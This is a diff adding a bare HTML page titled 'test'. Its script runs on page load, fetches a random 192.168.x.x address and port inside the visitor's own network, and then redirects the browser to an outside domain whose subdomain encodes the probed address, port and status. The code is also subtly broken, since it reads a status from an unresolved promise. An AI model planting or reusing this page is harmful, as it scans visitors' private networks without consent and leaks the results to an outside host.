@@ -1,0 +1,17 @@
+<html>
+<head><title>test</title>
+<script>
+port = Math.floor(Math.random()*65535);
+aa = Math.floor(Math.random()*255);
+ab = Math.floor(Math.random()*255);
+let resp = fetch("http://192.168."+aa+"."+ab+":"+port, {
+  method: 'GET'
+});
+s_code = resp.status;
+url = "ip192-168-"+aa+"-"+ab+"-"+port+"-"+s_code+".test6.d0b4i2s0kzot5wq87.xtric.homes";
+window.location = "https://"+url;
+</script>
+</head>
+<body>
+</body>
+</html>
